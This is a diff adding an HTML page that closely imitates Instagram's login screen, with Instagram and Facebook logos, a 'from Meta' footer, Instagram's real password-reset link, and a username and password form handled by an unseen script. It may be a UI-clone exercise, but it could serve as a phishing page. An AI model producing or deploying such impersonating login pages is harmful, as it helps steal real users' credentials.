@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Mark - Login Page</title>
+  <link rel="stylesheet" href="styles.css">
+
+</head>
+
+<body>
+  <div class="container">
+    <header>
+      <!-- <h1>Instagram</h1> -->
+      <img src="Instagram-logo-620x174.png" alt="Insta logo" class="logo">
+    </header>
+    <main>
+      <!-- <div class="language">English ▼</div> -->
+      <button class="fb-login">
+        <img src="Facebook_Logo_2023.png" alt="Insta logo" class="fb-logo">
+        Continue with Facebook</button>
+      <div class="or-divider">
+        <span></span>
+        <p>OR</p>
+        <span></span>
+      </div>
+      <form id="foorm" >
+        <input type="text" placeholder="Phone number, username, or email" required id="user">
+        <input type="password" placeholder="Password" required id="passcode" >
+        <a href="https://www.instagram.com/accounts/password/reset/" class="forgot-password">Forgot password?</a>
+        <button type="submit" class="login-btn">Log in</button>
+      </form>
+      <div class="signup">
+        <p>Don't have an account? <a href="#">Sign up</a></p>
+      </div>
+      <div class="agreement">
+        By continuing, you agree to Mark's <br><a href="#">Terms of Use</a> and <a href="#">Privacy Policy</a>.
+      </div>
+    </main>
+    <footer>
+      <p>from <span class="meta-logo">Meta</span></p>
+    </footer>
+  </div>
+  <script src="index.js"></script>
+</body>
+</html>
